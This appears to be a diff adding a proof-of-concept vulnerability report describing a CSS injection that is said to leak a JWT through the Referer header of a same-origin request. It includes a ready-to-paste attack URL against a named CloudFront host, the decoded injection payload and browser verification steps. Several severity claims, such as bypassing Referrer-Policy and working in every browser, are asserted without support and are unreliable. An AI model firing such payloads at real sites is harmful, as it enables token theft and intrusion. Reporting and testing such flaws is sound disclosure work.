@@ -1,0 +1,44 @@
+================================================================================
+CRITICAL: Same-Origin JWT Theft via CSS Injection
+================================================================================
+
+ATTACK URL (copy and paste into browser):
+
+https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzY0NjUzODQ4LCJpYXQiOjE3NjQ2NTMyNDgsImp0aSI6IjYyNTk3NmYwZTdhNDQzMGE5YzY4NTMwOGNmYWFiNzA0IiwidXNlcl91c2VyX3V1aWQiOiI2OTFlMjEzNi00OGJiLTRlNTUtOTMxOC1hNTk0YWM5YzNjZWMifQ.TESTTOKEN&_fn=x%27%3B%7D*%7Bbackground%3Aurl%28%27%2Fassets%2Findex.636befc6.js%27%29%21important%7D%2F*&_fo=y
+
+================================================================================
+PAYLOAD DECODED:
+================================================================================
+_fn=x';}*{background:url('/assets/index.636befc6.js')!important}/*
+
+================================================================================
+TEST INSTRUCTIONS:
+================================================================================
+
+1. Open the URL above in Chrome
+2. Press F12 to open DevTools
+3. Go to "Network" tab
+4. Refresh the page (Ctrl+R)
+5. Find the request to "index.636befc6.js" 
+6. Click on it
+7. Look at "Headers" tab
+8. Find "Referer" header
+
+================================================================================
+EXPECTED RESULT (CRITICAL CONFIRMED):
+================================================================================
+
+Referer: https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIi...FULL_JWT_TOKEN...&_fn=x';}*{background:url('/assets/index.636befc6.js')!important}/*&_fo=y
+
+If Referer contains the FULL URL with _to=JWT_TOKEN -> CRITICAL VULNERABILITY CONFIRMED!
+
+================================================================================
+WHY THIS IS CRITICAL:
+================================================================================
+
+1. Same-origin requests bypass Referrer-Policy
+2. JWT token leaks to CloudFront access logs
+3. Any attacker with access to CDN logs can steal tokens
+4. No user interaction beyond clicking the link
+5. Works on ANY browser (Chrome, Firefox, Safari)
+6. Attacker can append malicious _fn to ANY legitimate widget URL
